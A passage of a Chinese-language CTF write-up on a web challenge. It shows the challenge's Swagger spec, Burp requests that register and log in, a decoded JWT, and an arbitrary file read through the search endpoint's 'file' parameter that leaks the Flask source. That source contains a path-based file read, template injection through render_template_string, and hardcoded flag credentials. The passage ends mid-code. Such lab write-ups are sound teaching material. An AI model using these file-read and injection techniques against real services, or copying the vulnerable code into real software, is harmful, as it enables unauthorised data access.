&quot;title&quot;: &quot;Interface API&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;paths&quot;: &#123;</span><br><span class="line">      &quot;/api-base/v0/register&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Registration API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user registration&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Your wisdom is not sufficient to be called a sage&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/login&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Login API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user login&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/search&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Information Query API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used to query information&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;name&quot;: &quot;file&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;query&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;404&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;File not found&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/logout&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Logout API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user logout&quot;,</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;definitions&quot;: &#123;</span><br><span class="line">      &quot;UserRegistration&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;UserLogin&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;securityDefinitions&quot;: &#123;</span><br><span class="line">      &quot;TokenAuth&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;apiKey&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Authorization&quot;,</span><br><span class="line">        &quot;in&quot;: &quot;header&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;security&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;TokenAuth&quot;: []</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>不會看, 拋給D老師分析了一下:</p><h3 id="主要組成部分"><a href="#主要組成部分" class="headerlink" title="主要組成部分"></a>主要組成部分</h3><h3 id="基礎資訊"><a href="#基礎資訊" class="headerlink" title="基礎資訊"></a>基礎資訊</h3><p>API 版本：Swagger 2.0</p><p>標題：Interface API</p><p>版本：1.1</p><p>描述：介面 API 文檔</p><ol start="2"><li>API 端點分析<br>🔐 認證相關端點<br>POST &#x2F;api-base&#x2F;v0&#x2F;register - 用戶註冊</li></ol><p>需要 username 和 password</p><p>響應：200成功, 400參數錯誤, 401權限不足</p><p>POST &#x2F;api-base&#x2F;v0&#x2F;login - 用戶登入</p><p>需要 username 和 password</p><p>響應：200成功, 400參數錯誤</p><p>🔍 資料查詢端點<br>GET &#x2F;api-base&#x2F;v0&#x2F;search - 資訊查詢</p><p>需要 file 查詢參數</p><p>需要 Token 認證</p><p>響應：200成功, 400參數錯誤, 401未授權, 404檔案不存在</p><p>🚪 登出端點<br>GET &#x2F;api-base&#x2F;v0&#x2F;logout - 用戶登出</p><p>需要 Token 認證</p><p>響應：200成功, 401未授權</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;UserRegistration&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;,</span><br><span class="line">  &quot;UserLogin&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用BP注册一个账户先:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/register HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure><img src="ddb0bc5ed20228a85676ba21ed691acd.png" alt="ddb0bc5ed20228a85676ba21ed691acd.png" /><p>login 一下</p><img src="ceb050b212f68f02ec7f1146781f49e8.png" alt="ceb050b212f68f02ec7f1146781f49e8.png" /><p>用以下的cookie:<br>拋去jwt.io:</p><img src="9bb2273710f6ca2f594de0e6ea7f537b.png" alt="9bb2273710f6ca2f594de0e6ea7f537b.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/search   HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJwYXNzd29yZCI6ImEifQ.BN9dROQHEp6L0iPx03SgsNO2c3rGac428_lCXh4E2ig</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><img src="352dfcac48a77da66e3bb9065d9a1305.png" alt="352dfcac48a77da66e3bb9065d9a1305.png" /><p>盲猜一下這是flask寫的 , file &#x3D; app.py </p><img src="ea6506e3ad4c28e8926ab4ccfca1a780.png" alt="ea6506e3ad4c28e8926ab4ccfca1a780.png" /><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        <span class="variable language_">self</span>.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="variable language_">self</span>.username, <span class="string">&#x27;password&#x27;</span>: <span class="variable language_">self</span>.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>找到admin的信息了 , {“username”:”admin” , “password”:”password”} 再&#x2F;readflag</p><p>只要用户名是Plato 密码是ideal_state 就可以得到flag，但是它无法登录，也无法注册</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> 